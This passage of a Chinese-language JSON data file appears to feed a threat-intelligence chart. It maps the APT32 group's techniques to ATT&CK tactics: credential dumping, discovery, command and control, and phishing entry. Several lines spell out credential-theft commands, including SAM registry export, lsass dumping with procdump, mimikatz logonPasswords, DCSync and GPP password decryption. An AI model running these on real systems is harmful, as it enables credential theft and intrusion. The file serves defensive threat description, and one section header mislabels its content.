          "detail": "        内存凭据导出是从操作系统和软件中获取帐户登录和密码信息的过程，通常以散列或明文密码的形式。凭证可用于执行横向移动和访问受限信息。\n此技术中提到的一些工具可供攻击者和专业安全测试人员使用。可能还存在其他自定义工具。\nWindows：\nSAM (Security Accounts Manager)\nSAM是一个数据库文件，包含主机的本地帐户，通常是使用“net user”命令找到的帐户。要枚举SAM数据库，需要系统级访问。可以使用许多工具通过内存技术检索SAM文件：\n1、pwdumpx.exe\n2、gsecdump\n3、Mimikatz\n4、secretsdump.py\n或者，可以使用reg命令从注册表中提取SAM：\n1、reg save HKLM\\sam sam\n2、reg save HKLM\\system system\n        然后可以使用Creddump7在本地处理SAM数据库以检索哈希值。\n        注意：RID500帐户是本地内置的管理员。RID501是来宾帐户。用户帐户以RID1000+开头。\n缓存凭据(Cached Credentials)：\n        当域控制器不可用时，由Windows Vista和更高版本使用的DCC2（域缓存凭据版本2）哈希来缓存凭据。默认缓存凭据的数目会有所不同，并且每个系统都可以更改此数目。此哈希不允许传递哈希类型的攻击。可以使用许多工具通过内存技术检索SAM文件。\n1、pwdumpx.exe\n2、gsecdump\n3、Mimikatz\n        或者，reg.exe可用于从注册表中提取，Creddump7用于收集凭据。\n        注意：WindowsVista的缓存凭据是使用PBKDF2派生的。\n地方安全局（LSA）机密(Local Security Authority (LSA) Secrets)：\n        通过对主机的系统访问，LAS机密通常允许从本地帐户到基于域的帐户凭据的简单访问。注册表用于存储LSA机密。当服务在本地或域用户上下文中运行时，其密码存储在注册表中。如果启用了自动登录，此信息也将存储在注册表中。可以使用许多工具通过内存技术检索SAM文件。\n1、 pwdumpx.exe\n2、gsecdump\n3、 Mimikatz\n4、secretsdump.py\n        或者，可以使用reg.exe从注册表中提取文件，并使用Creddump7收集凭据。\n        注意：通过他的机制提取的密码是utf-16编码的，这意味着它们是以明文形式返回的。Windows 10增加了对LSA机密的保护，如缓解措施中所述。\n来自域控制器的(NTDSNTDS from Domain Controller)：\n        活动目录存储有关域成员的信息，包括用于验证凭据和定义访问权限的设备和用户。活动目录域数据库存储在NTDS.dit文件中。默认情况下，NTDS文件将位于域控制器的%SystemRoot%\\NTDS\\Ntds.dit中。\n        以下工具和技术可用于枚举NTDS文件和整个Active Directory哈希值的内容。\n1、Volume Shadow Copy\n2、secretsdump.py\n3、Using the in-built Windows tool, ntdsutil.exe\n4、Invoke-NinjaCopy\n        组策略首选项（GPP）文件(Group Policy Preference (GPP) Files)\n        组策略首选项（GPP）是允许管理员使用嵌入凭据创建域策略的工具。除其他外，这些策略允许管理员设置本地帐户。\n        这些组策略存储在域控制器上的SYSVOL中，这意味着任何域用户都可以查看SYSVOL共享并解密密码（AES私钥已在线泄漏）。\n        以下工具和脚本可用于从组策略首选项XML文件收集和解密密码文件：\n1、Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n2、Get-GPPPassword [5]\n3、gpprefdecrypt.py\n        注意：在SYSVOL共享上，可以使用以下命令枚举潜在的xml文件\n1、dir/s*.xml\n服务主体名称（SPN）(Service Principal Names (SPNs))：\n1、参考 ”利用 kerberoast”\n明文凭据(Plaintext Credentials)：\n        用户登录到系统后，会生成各种凭据并将其存储在内存中的“本地安全机构子系统服务（LSASS）”进程中。管理用户或系统可以获取这些凭据。\n        SSPI（安全支持提供程序接口）作为与多个安全支持提供程序（SSP）的通用接口发挥其作用：安全支持提供程序是一个动态链接库（dll），可为应用程序提供一个或多个安全软件包。\n以下SSP可用于访问凭据：\nMsv：交互式登录、批量登录和服务登录通过MSV身份验证包完成。Wdigest：摘要身份验证协议设计用于超文本传输协议（HTTP）和简单身份验证安全层（SASL）交换。kerberos:Windows 2000及更高版本中用于客户端-服务器域相互身份验证的首选。CredSSP:为远程桌面服务提供SSO和网络级身份验证。可以使用以下工具枚举凭据：\n1、Windows Credential Editor\n2、Mimikatz\n        除了内存技术外，LSASS进程内存还可以从目标主机转储并在本地系统上进行分析。\n        例如，在目标主机上使用procdump：\n1、procdump  -ma  lsass.exe  lsass_dump\n在本地，可以运行mimikatz：\n1、sekurlsa::Minidump lsassdump.dmp\n2、sekurlsa::logonPasswords\nDCSync：\n        DCSync是内存凭据导出的变体，可用于从域控制器获取敏感信息。该操作不是执行可识别的恶意代码，而是通过滥用域控制器的应用程序编程接口（API）来模拟远程域控制器的复制过程，从而起作用。域控制器上的管理员、域管理员、企业管理组或计算机帐户的任何成员都可以运行DCSync来从活动目录中提取密码数据，其中可能包括潜在有用帐户（如KRBTGT 和 Administrators）的当前和历史哈希值。然后，这些散列可以依次用于创建一个Golden Ticket，用于Kerberos 票据注入或更改帐户的密码，如帐户操作中所述。DCSync功能已包含在Mimikatz的“lsadump”模块中。Lsadump还包括NetSync，它通过传统复制协议执行DCSync。\nLinux：\n 进程文件系统(Proc filesystem)：\n        Linux上的/proc文件系统包含大量有关正在运行的操作系统状态的信息。以Root权限运行的进程可以使用此功能抓取其他正在运行的程序的实时内存。如果这些程序中的任何一个将密码以明文形式存储或在内存中存储密码哈希值，然后可以收集这些值用于使用或者暴力破解。这个功能已经在MimiPenguin中实现，这是一个受Mimikatz启发的开源工具。该工具转储进程内存，然后通过查找文本字符串和正则表达式模式来获取密码和哈希值，用来了解给定的应用程序（如gnome keyring、sshd和apache）如何使用内存来存储此类身份验证工件。",
          "children": [
            {
              "name": "APT32使用了Mimikatz, GetPassword_x64, 以及定制版本的Windows Credential Dumper, Hook Change Password, 和 Outlook Credential Dumper工具导出受控主机中的各类证书。",
              "itemStyle": {
                "color": "#510A2F"
              },
              "date": "2017-05-24",
              "value": "34",
              "detail": ""
            }
          ]
        }
      ]
    },
    {
      "name": "发现",
      "itemStyle": {
        "color": "#5261C1"
      },
      "date": "",
      "value": "",
      "detail": "发现战术包含一系列技术，攻击者利用这些技术获取关于目标系统和内部网络的知识。这些技术可辅助攻击者在决定如何行动之前观察环境并确定方向，帮助攻击者探测可控制的对象以及入口点周围的环境，以便发现它们对当前攻击意图有何助益。操作系统自带工具常被用于达成此类预攻击信息收集相关的意图。\n",
      "children": [
        {
          "name": "远程系统发现",
          "itemStyle": {
            "color": "#26AAE0"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        攻击者可能会尝试通过IP地址、主机名或网络上其他可用于从当前系统进行横向移动的逻辑标识符获取其他系统的列表。远程访问工具中可以存在功能来实现此目的，但是也可以使用操作系统上可用的实用程序。攻击者还可以使用本地主机文件，以发现主机名到远程系统的IP地址的映射。\nWindows:\n        获取此信息的示例工具和命令包括使用Net的 “ping” 或 “net view”。可以查看C:\\Windows\\System32\\Drivers\\etc\\hosts文件中的内容以深入了解系统上现有主机名到IP的映射。\nMAC:\n        对于 MAC ，bonjour协议用于发现同一广播域内的其他基于Mac的系统，诸如 “ping” 之类的实用程序可用于收集有关远程系统的信息。可以查看/etc/hosts文件中的内容以深入了解系统上现有主机名到IP的映射。\nLinux:\n        诸如 “ping” 之类的实用程序可用于收集有关远程系统的信息。可以查看/etc/hosts文件中的内容以深入了解系统上现有主机名到IP的映射。",
          "children": [
            {
              "name": "APT32使用net view命令显示目标网络中的所有可用共享，包括C$和admin$等管理共享。APT32还使用了ping命令探测网络中的其他存活主机。",
              "itemStyle": {
                "color": "#F99081"
              },
              "date": "2017-05-24",
              "value": "39",
              "detail": ""
            }
          ]
        },
        {
          "name": "系统网络配置发现",
          "itemStyle": {
            "color": "#34A534"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        攻击者可能会寻找有关其访问的系统或通过远程系统的信息发现的网络配置和设置的详细信息。存在几个可用于收集此信息的操作系统管理实用程序。示例包括Arp、ipconfig / ifconfig、nbtstat和route。",
          "children": [
            {
              "name": "APT32使用ipconfig/all命令从系统收集IP地址和网络配置情况。",
              "itemStyle": {
                "color": "#06C13F"
              },
              "date": "2017-05-24",
              "value": "41",
              "detail": ""
            }
          ]
        },
        {
          "name": "账户发现",
          "itemStyle": {
            "color": "#0B93F0"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "攻击者可能会尝试获取本地系统或域帐户的列表。\nWindows：\n        能够获得这种信息的示例命令是使用Net实用程序或通过使用dsquery的net user，net group以及net localgroup。如果攻击者试图识别主要用户，当前登录用户或通常使用系统的用户组，则可以应用系统所有者/用户发现。\nMAC：\n        在MAC上，可以通过groups和id命令枚举组。专门在MAC中，dscl . list /Groups和dscacheutil -q group也可以用来枚举组和用户。\nLinux:\n        在Linux上，可以通过使用世界范围内可读的/etc/passwd文件来枚举本地用户。在mac中，除/etc/master.passwd文件外，此文件仅用于单用户模式。此外，可以通过groups和id命令枚举组。\n",
          "children": [
            {
              "name": "APT32使用“net localgroup administrators”命令枚举管理员账户，使用“net group \"Domain Controllers\" /domain”命令枚举域控服务器。",
              "itemStyle": {
                "color": "#4A1437"
              },
              "date": "2017-05-24",
              "value": "35",
              "detail": ""
            }
          ]
        },
        {
          "name": "网络服务扫描",
          "itemStyle": {
            "color": "#CB6D62"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        攻击者可能会尝试获取在远程主机上运行的服务列表，包括可能容易受到远程软件利用的服务。获取此信息的方法包括使用系统附带的工具进行端口扫描和漏洞扫描。",
          "children": [
            {
              "name": "APT32的后门会探测受控主机所在网络中其他主机的开放端口、对应服务、操作系统指纹以及其他一些脆弱性信息。",
              "itemStyle": {
                "color": "#498E1B"
              },
              "date": "2017-05-24",
              "value": "37",
              "detail": ""
            }
          ]
        },
        {
          "name": "系统信息发现",
          "itemStyle": {
            "color": "#27D454"
          },
          "date": "2018-03-13",
          "value": "",
          "detail": "        攻击者可能试图获取有关操作系统和硬件的详细信息，包括版本、修补程序、热修复程序、服务包和体系结构。\nWindows：\n        获取此信息的示例命令和实用程序包括的cmd中的ver、Systeminfo和dir，用于基于当前文件和目录识别信息。\nMac：\n        在Mac上，systemsetup命令提供了系统的详细分类，但需要管理权限。此外，system_profiler提供了无需提升权限即可非常详细地细分配置、防火墙规则、装载卷、硬件和许多其他内容。\n",
          "children": [
            {
              "name": "APT32会收集受控主机的操作系统版本和计算机名称。APT32的一个后门还通过查询Windows注册表以收集系统信息，此外APT32的MacOS后门在第一次连接到C&C服务器时会收集计算机的指纹特征。",
              "itemStyle": {
                "color": "#E6D990"
              },
              "date": "2018-03-13",
              "value": "40",
              "detail": ""
            }
          ]
        },
        {
          "name": "系统网络连接发现",
          "itemStyle": {
            "color": "#B3C89C"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "攻击者可以通过查询网络上的信息来尝试获取与它们当前正在访问的受感染系统之间或从远程系统获得的网络连接的列表。\nWindows：\n        获取这些信息的实用程序和命令包括netstat、“net use”和与Net的“net session”。\nMac 和 Linux：\n        在mac和Linux中，netstat和lsof可以用来列出当前的连接。who -a和w可用于显示当前登录的用户，类似于“net session”。\n",
          "children": [
            {
              "name": "APT32使用netstat -anpo tcp命令收集受控计算机中的tcp连接情况。",
              "itemStyle": {
                "color": "#8394B5"
              },
              "date": "2017-05-24",
              "value": "42",
              "detail": ""
            }
          ]
        },
        {
          "name": "系统所有者/用户发现",
          "itemStyle": {
            "color": "#459D6C"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "Windows：\n        攻击者可能试图识别主要用户、当前登录的用户、通常使用系统的一组用户，或者用户是否正在积极使用系统。他们可以例如通过检索帐户用户名或使用内存凭据导出做到这一点。可以使用其他发现技术以多种不同的方式收集信息，因为用户和用户名的详细信息在整个系统中非常普遍，包括运行进程所有权、文件/目录所有权、会话信息和系统日志。\nMac：\n        在Mac上，当前登录的用户可以被识别为users、w和who。\nLinux：\n        在Linux上，当前登录的用户可以被识别为w和who。",
          "children": [
            {
              "name": "APT32使用whoami收集受控计算机的所有用户情况。",
              "itemStyle": {
                "color": "#7878F1"
              },
              "date": "2017-05-24",
              "value": "43",
              "detail": ""
            }
          ]
        },
        {
          "name": "文件和目录发现",
          "itemStyle": {
            "color": "#0F2294"
          },
          "date": "2019-03-20",
          "value": "",
          "detail": "        攻击者可能会枚举文件和目录，或者可能在主机或网络共享的特定位置中搜索文件系统中的某些信息。\nWindows：\n        用于获取此信息的示例实用程序是dir和tree.自定义工具也可以用于收集文件和目录信息以及与Windows API进行交互。\nMac and Linux：\n        在Mac和Linux中，这种发现是通过ls，find和locate命令完成的。",
          "children": [
            {
              "name": "APT32的后门程序会枚举受控主机中的所有文件和目录。",
              "itemStyle": {
                "color": "#F59369"
              },
              "date": "2019-03-20",
              "value": "36",
              "detail": ""
            }
          ]
        },
        {
          "name": "查询注册表",
          "itemStyle": {
            "color": "#967AFC"
          },
          "date": "2019-03-20",
          "value": "",
          "detail": "        攻击者可以与Windows注册表交互以收集有关系统，配置和已安装软件的信息。\n        注册表包含有关操作系统、配置、软件和安全性的大量信息。一些信息可能有助于攻击者在网络中进一步操作。\n",
          "children": [
            {
              "name": "APT32的后门通过查询注册变的方式收集目标系统的信息。",
              "itemStyle": {
                "color": "#44284A"
              },
              "date": "2019-03-20",
              "value": "38",
              "detail": ""
            }
          ]
        }
      ]
    },
    {
      "name": "命令与控制",
      "itemStyle": {
        "color": "#FAED68"
      },
      "date": "",
      "value": "",
      "detail": "命令和控制战术包含一系列技术，攻击者利用这些技术能够与受害网络内的被控系统进行通信。攻击者通常会尝试模仿正常的、符合预期的流量以躲避检测。根据受害网络的结构和防御情况，攻击者可以通过多种方式建立具有各种隐藏级别的命令和控制信道。\n",
      "children": [
        {
          "name": "非常用端口",
          "itemStyle": {
            "color": "#647582"
          },
          "date": "2019-03-20",
          "value": "",
          "detail": "        攻击者可能会通过非标准端口进行C2通信，以绕过配置不当的代理和防火墙。",
          "children": [
            {
              "name": "APT32后门可以在后门配置中指定在非常用TCP端口（例如14146）上使用HTTP。",
              "itemStyle": {
                "color": "#25BDB1"
              },
              "date": "2019-03-20",
              "value": "53",
              "detail": ""
            }
          ]
        },
        {
          "name": "定制的命令和控制协议",
          "itemStyle": {
            "color": "#2453AD"
          },
          "date": "2017-05-14",
          "value": "",
          "detail": "       攻击者可以使用自定义命令和控制协议进行通信，而不是将命令/数据封装在现有的标准应用层协议中。实现包括模仿众所周知的协议或在TCP/IP/另一个标准网络堆栈提供的基本协议的基础上开发自定义协议（包括原始套接字）。",
          "children": [
            {
              "name": "APT32使用的Cobalt Strike后门工具的可扩展C2功能实现了网络流量融合。APT32的后门还可以通过在DNS数据包的子域字段中对数据进行编码来实现数据渗漏。此外，APT32的MacOS后门为C2数据包引入随机值实现了一种特殊的数据格式。",
              "itemStyle": {
                "color": "#A2A6C1"
              },
              "date": "2017-05-14",
              "value": "54",
              "detail": ""
            }
          ]
        },
        {
          "name": "标准应用层协议",
          "itemStyle": {
            "color": "#A45894"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        攻击者可能会使用通用的标准化应用层协议（例如HTTP、HTTPS、SMTP或DNS）进行通信，以避免与现有流量混合而被检测到。远程系统的命令（通常是这些命令的结果）将嵌入在客户端和服务器之间的协议流量中。\n        对于在安全区内部发生的连接(例如代理或中枢节点与其他节点之间的连接)，常用的协议是RPC、SSH或RDP协议。",
          "children": [
            {
              "name": "APT32利用javascript通过HTTP或HTTPS协议与受控主机通信的并下载其他的恶意框架。APT32还可以使用包含了office宏的电子邮件建立命令与控制信道。此外APT32后门还可以通过在DNS包的子域字段中对数据进行编码来建立命令与控制信道。",
              "itemStyle": {
                "color": "#B20184"
              },
              "date": "2017-05-24",
              "value": "55",
              "detail": ""
            }
          ]
        },
        {
          "name": "常用端口",
          "itemStyle": {
            "color": "#50B682"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "       攻击者可以通过常用端口进行通信，绕过防火墙或网络检测系统，并与正常的网络活动融合，以避免更详细的检查。它们可以使用常见的开放端口，如：\nTCP:80（http）\nTCP:443（https）\nTCP:25（SMTP）\nTCP/UDP:53（DNS）\n他们可以使用与端口相关的协议或完全不同的协议。\n       对于在安全区内部发生的连接（例如代理或枢轴节点与其他节点之间的连接），常见端口的示例如下：\nTCP/UDP:135（RPC）\nTCP/UDP:22（ssh）\nTCP/UDP:3389（RDP）\n",
          "children": [
            {
              "name": "APT32后门通常使用了80端口实现命令和控制信道。",
              "itemStyle": {
                "color": "#3F948E"
              },
              "date": "2017-05-24",
              "value": "52",
              "detail": ""
            }
          ]
        }
      ]
    },
    {
      "name": "影响",
      "itemStyle": {
        "color": "#8D419B"
      },
      "date": "",
      "value": "",
      "detail": "初始接入战术包含一系列技术，这些技术利用各种入口向量帮助攻击者获得初始驻留据点。能够用于获取驻留据点的技术既包括针对性的钓鱼攻击，也包括利用面向公众的WEB服务器的缺陷。通过初始接入战术获得的驻留据点可以允许继续访问，例如使用有效账户或外部远程服务，也可以通过修改口令而被限制使用。\n",
      "children": [
        {
          "name": "由攻陷网站驱动",
          "itemStyle": {
            "color": "#334FEB"
          },
          "date": "2018-03-13",
          "value": "",
          "detail": "        由攻陷网站驱动就是当攻击者在用户正常浏览网页的过程中接入该系统。使用此技术，用户的浏览器将会成为攻击目标。\n向浏览器发送漏洞代码的方式有多种，包括：\n1、合法的网站会受到攻击，攻击者会注入某种形式的恶意代码，如JavaScript、iFrames、跨站点脚本。\n2、恶意广告是通过合法的广告提供商付费和服务的。\n3、内置的web应用程序界面可用于插入任何其他类型的对象，这些对象可用于显示web内容或包含在访问客户端上执行的脚本（例如论坛帖子、评论和其他用户可控制的web内容）。\n        通常，攻击者使用的网站是特定团体（如政府、特定行业或地区）访问的网站，其目标是基于共同利益损害特定用户或一组用户。这种有针对性的攻击是指一种战略性的网络妥协或水坑攻击。有几个已知的例子说明了这一点。\n典型的有共享网站驱动的例子：\n1、用户访问一个网站，该网站被用来托管对手控制的内容。\n2、脚本会自动执行，通常会搜索浏览器和插件的版本以查找可能存在漏洞的版本。\n        (1) 可能需要用户通过启用脚本或活动网站组件并忽略警告对话框来协助此过程。\n3、找到易受攻击的版本后，利用漏洞的代码将传递到浏览器。\n4、如果攻击成功，则除非有其他保护措施，否则将在用户系统上执行敌方代码。\n        (1) 在某些情况下，在发送攻击代码之前，需要在初始扫描之后再次访问网站。\n        与利用公众应用不同的是，此技术的重点是在访问网站时利用客户端上的软件。这通常会让攻击者访问内部网络上的系统，而不是DMZ中的外部系统。",
          "children": [
            {
              "name": "APT32会使用诱骗受害者访问已经攻陷的水坑网站的方式实现对目标的初始感染。",
              "itemStyle": {
                "color": "#885866"
              },
              "date": "2018-03-13",
              "value": "1",
              "detail": ""
            }
          ]
        },
        {
          "name": "附件钓鱼",
          "itemStyle": {
            "color": "#0AF637"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        鱼叉式网络钓鱼附件是鱼叉式网络钓鱼的一种特殊变体。鱼叉式网络钓鱼附件不同于其他形式的鱼叉式网络钓鱼，因为它使用附加在电子邮件上的恶意软件。所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社会工程。在这种情况下，攻击者会在鱼叉式网络钓鱼电子邮件中附加一个文件，通常依靠用户执行来获得执行权。 \n        附件有许多选项，如Microsoft Office文档、可执行文件、pdf或存档文件。一旦打开附件(并可能点击过去的保护)，攻击者的有效负载会利用漏洞或直接在用户系统上执行。鱼叉式网络钓鱼电子邮件的文本通常试图给出一个合理的理由来解释为什么应该打开该文件，并可能解释如何绕过系统保护。电子邮件还可能包含如何解密附件(如zip文件密码)的说明，以规避电子邮件边界防御。攻击者经常操纵文件扩展名和图标，以使附加的可执行文件看起来像是文档文件，或者利用一个应用程序的文件看起来像是另一个应用程序的文件。",
          "children": [
            {
              "name": "APT32会发送带有恶意代码并伪装成文档或电子表格的电子邮件实现对目标的初始感染。",
              "itemStyle": {
                "color": "#960F03"
              },
              "date": "2017-05-24",
              "value": "2",
              "detail": ""
            }
          ]
        },
        {
          "name": "链接钓鱼",
          "itemStyle": {
            "color": "#10143E"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        带链接的鱼叉式网页钓鱼是鱼叉式网页钓鱼的一种特殊变种。它与其他形式的鱼叉式网络钓鱼不同之处在于它使用链接来下载电子邮件中包含的恶意软件，而不是将恶意文件附加到电子邮件本身，以避免可能检查电子邮件附件的防御。\n        所有形式的鱼叉式网络钓鱼都是以电子方式提供的针对特定个人，公司或行业的社会工程。在这种情况下，恶意电子邮件包含链接。通常，链接将伴随社会工程文本，并要求用户主动点击或复制并将URL粘贴到浏览器中，从而利用用户执行。被访问的网站可能使用漏洞攻击来破坏Web浏览器，或者将首先根据电子邮件的借口提示用户下载应用程序、文档、zip文件甚至可执行文件。攻击者还可以包括旨在与电子邮件阅读器直接交互的链接，包括旨在直接利用终端系统的嵌入式图像或验证电子邮件的接收（即网络错误/网络信标）。",
          "children": [
            {
              "name": "APT32会发送带有恶意链接的电子邮件实现对目标的初始感染。",
              "itemStyle": {
                "color": "#A90745"
              },
              "date": "2017-05-24",
              "value": "3",
              "detail": ""
            }
          ]
        }
      ]
    }
  ],
  "code": 0,
  "msg": "SUCCESS",
  "count": 11
}
